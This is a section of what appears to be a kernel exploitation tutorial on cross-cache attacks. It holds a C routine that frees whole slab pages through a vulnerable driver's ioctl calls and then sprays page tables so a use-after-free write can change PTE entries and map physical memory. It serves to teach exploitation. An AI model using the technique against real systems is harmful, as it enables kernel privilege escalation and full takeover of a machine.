## 7. Cross-Cache Attack (Advanced)

When the freed object's cache is hard to reclaim with useful objects:

```c
/*
 * Cross-cache attack: Free an entire slab page, then have it
 * repurposed for a different cache or page tables.
 *
 * 1. Allocate many objects to fill a slab page
 * 2. Free ALL objects on that page (page returns to buddy allocator)
 * 3. Allocate page tables (PTE) — the freed page becomes a PTE page
 * 4. Use UAF write to modify PTE entries
 * 5. Map physical memory as RW in userspace
 */

static void cross_cache_prep(int vuln_fd)
{
    /* Fill an entire slab with vulnerable objects */
    int objs[512]; /* enough to fill multiple slab pages */

    for (int i = 0; i < 512; i++) {
        ioctl(vuln_fd, ALLOC_CMD, 0);
        /* In a real driver, you'd have multiple objects */
    }

    /* Free all objects on the target page */
    for (int i = 0; i < 512; i++) {
        ioctl(vuln_fd, FREE_CMD, 0);
    }

    /* Now spray page tables via mmap */
    void *map = mmap(NULL, 0x1000000, PROT_READ | PROT_WRITE,
                     MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    /* Touch pages to force PTE allocation */
    memset(map, 0, 0x1000000);

    /* The freed slab page may now be used as a PTE page */
    /* UAF write can now modify page table entries */
}
